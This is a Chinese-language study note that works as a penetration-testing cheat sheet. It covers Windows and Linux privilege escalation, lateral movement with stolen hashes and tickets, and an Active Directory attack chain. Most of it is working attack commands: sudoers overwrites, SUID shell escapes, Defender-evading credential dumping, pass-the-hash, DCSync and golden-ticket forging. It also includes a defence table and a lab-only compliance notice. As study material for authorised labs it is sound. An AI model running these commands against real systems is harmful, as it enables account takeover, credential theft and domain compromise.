---
title: "提权 + 内网渗透 系统性知识（2026-08-18 五轮千轮研究）"
type: note
domain: Security
status: active
tags: [knowledge/security]
source: null
date: 2026-08-18
---
# 提权 + 内网渗透 系统性知识（2026-08-18 五轮千轮研究）

> 覆盖：提权基础 / Windows 提权 / Linux 提权 / 内网渗透 / AD 攻击链
> 定位：从「Web 漏洞发现」进阶到「拿下整台机器 + 横向移动」的作战手册
> 配套：src-bug-hunting 技能（SRC 入门）+ knowledge/Security/cybersec-entry-path-2026-08-18.md（入行路线）

## 一、提权基础

### 权限层级
```
Windows: Guest < User < Administrator < System < TrustedInstaller（最高）
Linux:   user < root
类型: 纵向提权（User→Admin/Root/System，最常见）/ 横向提权（同级换账户）
```

### 提权前自问
```
当前权限是否够用？提权动静大，可能蓝屏/宕机 → 影响生产系统得不偿失
低权限限制: 无法获取哈希/查特权进程/改防火墙/改注册表 → 才需要提权
```

## 二、Windows 提权（6 类手法）

### 1. SeImpersonatePrivilege + Potato 家族（最关键，2026 首选）
```
前提: whoami /priv 看 SeImpersonatePrivilege Enabled
      （服务账户/IIS 应用池/MSSQL 默认有）
原理: NTLM 中继欺骗高权限账户认证 → 窃取高权限 Token → 模仿提权
家族: RottenPotato → JuicyPotato(Win10 1809 前) → RoguePotato(需外部主机)
      → PrintSpoofer(2020, 打印服务) → GodPotato(2023+, DCOM, 通杀 2012-2022)
      → JuicyPotatoNG(新, Win10/11)
2026 现状: GodPotato 首选（两命令 10 秒提权），PrintSpoofer 次选，SweetPotato 组合
利用: GodPotato.exe -cmd "cmd.exe /c whoami" → nt authority\system
检测: Sysmon Event 1/13/18、Event 4624 logon type 9
```

### 2. 未加引号的服务路径 (Unquoted Service Paths)
```
原理: 路径含空格无引号 → 从右向左截断尝试执行
     C:\Program Files (x86)\IObit\...  → 尝试 C:\Program.exe / Program Files.exe / IObit.exe
枚举: PowerUp.ps1 (Get-UnquotedService)
利用: 可写目录放恶意 exe → 重启（AUTO_START）或重启服务 → SYSTEM
日志铁证: CommandLine 把空格后的部分当参数
防御: 路径加引号 + icacls 收紧 ACL
```

### 3. 可修改服务 (Modifiable Services)
```
前提: 低权限用户对 SYSTEM 服务有 SERVICE_CHANGE_CONFIG/SERVICE_START
利用: sc config binPath=恶意程序 → 重启服务 → SYSTEM
工具: PowerUp Install-ServiceBinary
```

### 4. 令牌窃取 (Token Impersonation)
```
Admin→SYSTEM: 注册服务(LocalSystem)写管道 → ImpersonateNamedPipeClient
              → 窃取 SYSTEM Token → CreateProcessWithTokenW
```

### 5. Bypass UAC
```
前提: 管理员组成员，目标从中等完整性 → 高完整性
常用: 注册表路径劫持（系统自带程序）/ 功能管理程序绕过（无文件）
```

### 6. DLL 劫持
```
原理: 程序加载 b.dll 未指定绝对路径 → 在高优先级目录放恶意 dll
前提: 拥有目录写入权限
```

### Windows 枚举速查
```
whoami /priv          # 看 SeImpersonatePrivilege（第一件事）
winpeas               # 自动枚举（PEASS-ng）
PowerUp.ps1           # 服务配置漏洞枚举
sc qc <服务名>         # 看 BINARY_PATH_NAME / SERVICE_START_NAME
wmic service list     # 服务列表
```

## 三、Linux 提权（8 条路径，90% 场景）

### 提权决策流程图
```
拿到 Linux Shell
  ↓ sudo -l ── 有 NOPASSWD 条目? ──→ GTFOBins 查利用 → root
  ↓ NO SUID 扫描 ── 有可利用二进制? ──→ GTFOBins → root
  ↓ NO LinPEAS 全扫描 ── 看高亮输出
  ↓ NO bash_history/配置 ── 有密码? ──→ su/SSH 切换 → 提权
  ↓ NO crontab + pspy ── root 脚本可写? ──→ 修改脚本 → root
  ↓ NO 文件权限 ── /etc/passwd 可写? ──→ 追加 root 用户 → root
  ↓ NO 内核版本 ── PwnKit/DirtyPipe? ──→ CVE 利用 → root
  ↓ NO NFS / docker 组 ──→ 逃逸
```

### 路径 1: sudo 配置错误（命中率最高）
```
sudo -l 是第一步，没有之一。任何 (ALL) NOPASSWD: 都是提权入口
常见利用:
  sudo vim -c ':!/bin/bash'                      # vim 开 shell
  sudo python3 -c 'import os; os.system("/bin/bash")'
  sudo find / -exec /bin/bash \; -quit           # find（常被忽视）
  sudo less /etc/passwd → !/bin/bash             # less 交互 shell
  sudo nmap --interactive → !sh                  # 旧版 nmap
  sudo cp /dev/stdin /etc/sudoers                # cp 覆盖 sudoers
查询: GTFOBins (gtfobins.github.io) 任何命令必有用法
```

### 路径 2: SUID/SGID 滥用
```
查找: find / -perm -4000 -type f 2>/dev/null
高频可利用: find/vim/python/bash/cp/perl/pkexec
  find . -exec /bin/bash -p \; -quit
  /bin/bash -p
  python -c 'import os; os.execl("/bin/bash","sh","-p")'
自定义 SUID 程序: strings/ltrace/strace 分析 + PATH 劫持 + LD_PRELOAD
```

### 路径 3: Cron 计划任务（被严重低估）
```
必跑: pspy（监控隐藏 root cron，UID=0 命令）
枚举: crontab -l / cat /etc/crontab / ls -la /etc/cron.* / var/spool/cron/
利用: 脚本可写 → 修改 / PATH 劫持（相对路径）/ 通配符注入（tar --checkpoint）
```

### 路径 4: 内核漏洞（精准打击）
```
| 漏洞 | CVE | 影响 | 备注 |
| PwnKit | CVE-2021-4034 | 几乎所有 Linux | pkexec SUID 通杀 |
| DirtyPipe | CVE-2022-0847 | 内核 5.8-5.16.11 | 写任意只读文件 |
| DirtyCow | CVE-2016-5195 | 内核 < 4.8.3 | 老靶机常见 |
| Looney Tunables | CVE-2023-4911 | glibc 2.34-2.38 | 较新 |
| Baron Samedit | CVE-2021-3156 | Sudo < 1.9.5p2 | 缓冲区溢出 |
工具: linux-exploit-suggester-2 / uname -a 先看内核版本
```

### 路径 5: 密码与凭据搜索
```
cat ~/.bash_history ~/.zsh_history          # 历史命令（高命中率）
find / -name "*.php" -exec grep -l "password|db_pass" {} ;
find / -name "wp-config.php" .env id_rsa *.pem 2>/dev/null
grep -r "password" /home/ /opt/ /var/ 2>/dev/null
经验: 找到数据库密码 → 试 SSH 登录其他用户（密码重用无处不在）
```

### 路径 6: 文件权限漏洞
```
ls -la /etc/passwd 可写 → openssl passwd -1 hacked → 追加 root 用户 → su
/etc/sudoers 可写 → echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
find / -writable -type f | grep -E "cron|sudoers|passwd|shadow|hosts"
```

### 路径 7: NFS 错误配置
```
showmount -e <target> 看 no_root_squash 共享
攻击机 root 挂载 → cp /bin/bash 到共享 + chmod +s → 目标机执行 bash_suid -p
```

### 路径 8: Docker/LXC 逃逸
```
检测: cat /proc/1/cgroup | grep docker / ls -la /.dockerenv / id | grep docker
docker 组: docker run -v /:/mnt --rm -it alpine chroot /mnt sh（宿主机 root）
CVE-2019-5736: runc 覆写（Docker < 18.09.2）
CVE-2026-31431 Copy Fail: page cache 逃逸（内核 < 6.12，不修改磁盘）
PwnKit 容器内同样可用（pkexec SUID）
```

### Linux 工具链
```
linpeas.sh（PEASS-ng，不落地执行: curl ... | sh）
pspy（进程监控，找隐藏 cron）
linux-exploit-suggester-2 / traitor（自动提权）
GTFOBins（sudo/SUID 利用查询必备）
HackTricks（Linux 提权参考）
HTB 练习: Bashed(Easy) / Curling(Easy) / Tartarsauce(Medium)
```

## 四、内网渗透基础

### 横向移动三步曲
```
拿下第一台机器 → 信息收集（内网地图）→ 凭据获取（钥匙）→ 远程执行（开门）→ 循环滚雪球
```

### 信息收集（先画内网地图）
```
arp -a → nmap → 内网拓扑
Windows 主机重点端口: 445(SMB) / 5985(WinRM) / 3389(RDP)
域信息（系统自带命令零依赖）:
  nltest /dclist:domain.local          # 域控列表
  net user /domain                     # 域用户
  net group "Domain Admins" /domain    # 域管（最终目标）
  net view /domain                     # 域内主机
  nltest /domain_trusts                # 域信任关系
BloodHound CE + SharpHound: AD 攻击路径可视化（神器）
  SharpHound.exe -c All
  bloodhound-python -u user -p pass -ns <DC_IP> -d domain.local -c All
```

### 凭据获取（钥匙三形态）
```
| 方式 | 工具 | 拿到什么 |
| lsass 内存转储 | Mimikatz sekurlsa::logonpasswords / Procdump 离线 | 明文+NTLM |
| SAM 数据库 | secretsdump.py | 本地哈希 |
| 浏览器/配置 | LaZagne | 明文密码 |
| DCSync | secretsdump (lsadump::dcsync) | 全域哈希（终极）|
⚠️ Mimikatz 别直接落地（Defender 拦）→ Procdump 离线转储拷回攻击机解析
⚠️ 本地哈希 vs 域哈希别混: SAM=本地有限, lsass/DCSync=域哈希横全网
```

### 三张通行证（凭据利用）
```
| 方法 | 前提 | 场景 |
| PtH 哈希传递 | NTLM 哈希 | SMB/WinRM（最常见，90% 场景）|
| PtT 票据传递 | .kirbi 票据 | Kerberos 服务认证 |
| OPtH 哈希换票据 | NTLM 哈希 | 想访问 Kerberos 服务 |
| PTK 密钥传递 | AES256 | NTLM 被禁时 |

命令:
  nxc smb 目标 -u admin -H hash -x "whoami"     # NetExec（CME 继任者）
  evil-winrm -i 目标 -u admin -H hash            # WinRM 交互 shell
  PsExec.exe -hashes :hash \\目标 cmd.exe
  mimikatz sekurlsa::pth /user:admin /domain:X /ntlm:hash
⚠️ KB2871997: 普通用户无法 PTH，但 SID 500 Administrator 例外
⚠️ PtH 前验证 SMB 签名: nxc smb 目标 --gen-relay-list
```

## 五、AD 域渗透攻击链（五步）

### 完整攻击链
```
域内立足点（低权限用户）
  ↓ 侦察枚举: BloodHound + PowerView
  ↓ 密码攻击: Kerberoasting / AS-REP Roasting / 密码喷洒
  ↓ 横向移动: PTH / PTT / OPtH / WinRM
  ↓ 提升至 DA: ACL 滥用 / DCSync
  ↓ 持久化: Golden Ticket / Silver Ticket / Skeleton Key
```

### Kerberoasting（最高频，最低门槛）
```
原理: 任何域用户可请求有 SPN 服务账户的 TGS → 离线破解
攻击: impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC> -request
破解: hashcat -m 13100 kerberoast.txt rockyou.txt
```

### AS-REP Roasting（无需凭据）
```
原理: 用户禁用预认证(DONT_REQ_PREAUTH) → 无需凭据获取 AS-REP 哈希
攻击: impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass
破解: hashcat -m 18200
HTB 案例: Forest 靶机从 LDAP 匿名枚举 → AS-REP Roast → 初始立足
```

### 密码喷洒
```
适合: 有用户名列表无密码，避免账户锁定
kerbrute passwordspray -d domain.local --dc <DC> users.txt 'Welcome1!'
原则: 先查锁定阈值（通常 5 次），每批 ≤3 次，批次间隔 30 分钟
```

### ACL 滥用（BloodHound 核心价值）
```
| ACL | 利用 |
| GenericAll on User | 改密码 / 加 SPN |
| GenericAll on Group | 把自己加入 Domain Admins |
| GenericWrite on User | 加 SPN → Kerberoast |
| WriteDACL | 给自己加 DCSync 权限 |
| ForceChangePassword | 强制改管理员密码 |
```

### DCSync（终极手段）
```
secretsdump domain/admin:pass@<DC_IP>
secretsdump domain/admin@<DC_IP> -just-dc-user krbtgt   # 黄金票据钥匙
前提: Replicating Directory Changes 权限（BloodHound 找）
```

### Golden Ticket（持久化神器）
```
条件: krbtgt hash + 域名 + 域 SID + 目标用户名
mimikatz kerberos::golden /user:Administrator /domain:X /krbtgt:hash /sid:S-1-5-21-XXX
恐怖之处: 即使域管改密码，krbtgt 不变 → 黄金票据永久有效（默认 10 年）
Silver Ticket: 伪造单服务 ST（server hash，不经过 KDC）
Skeleton Key: 域控 lsass 注入万能钥匙（所有密码都能登录）
```

### 实战案例（Sauna 完整链）
```
员工姓名(about.html) → 构造用户名 → AS-REP Roast → 破解
→ evil-winrm shell → winPEAS 发现更多凭据 → 切换账户
→ BloodHound 发现 DCSync 权限 → secretsdump -just-dc-user Administrator
→ PtH psexec → SYSTEM
核心: 每拿到一层权限就重新收集（滚雪球）
```

## 六、工具链速查

```
通用: PEASS-ng (linpeas/winpeas) | GTFOBins | HackTricks | searchsploit
横向: NetExec (nxc)【CME 已停维，用 nxc】| Impacket (wmiexec/atexec/secretsdump/psexec)
      | evil-winrm | CobaltStrike jump | SharpLateral（无文件）
票据: Mimikatz | Rubeus (kerberoast/asreproast/s4u/monitor) | Kekeo
AD:   BloodHound CE | PowerView | bloodyAD
免杀: Procdump 离线转储 | 无文件攻击 (WMI/Scheduled Tasks)
```

## 七、防御视角（蓝队对照）

| 攻击 | 防御 |
|:---|:---|
| Kerberoasting | 监控 4769 TGS 请求；服务账户密码 25 位+ |
| AS-REP | 检查 DONT_REQ_PREAUTH 账户 |
| DCSync | 监控 4662；严格控制复制权限 |
| PTH | Credential Guard；禁用 NTLM |
| Golden Ticket | 监控异常 TGT；定期双重重置 krbtgt |
| Potato | 移除服务账户 SeImpersonatePrivilege；LSA Protection |
| 凭据泄露 | LAPS 管理本地管理员密码；域管不在普通服务器登录 |

## 八、学习路径建议

```
① 先练靶场: HTB Bashed/Curling(Easy) → Tartarsauce(Medium) → Forest(AD入门)
② 提权: linpeas 全跑 + 对照本手册 8 条路径逐条验证
③ 内网: 本地搭 AD 环境（Windows Server + DC）→ BloodHound 全家桶
④ 认证: OSCP 覆盖大部分；CRTP 专攻 AD
⑤ 结合 sora 优势: 信息收集自动化脚本 = 内网侦察的 AI 增强
```

## 合规红线（重申）
```
只可在授权靶场/实验室练习（HTB/本地 AD 环境）
未授权测试 = 违法（网络安全法 27 条）
本文所有技术仅用于安全研究
```

---
> 🗺️ 属于 [[MOC-Security]] · [[Home|🏠 Home]]
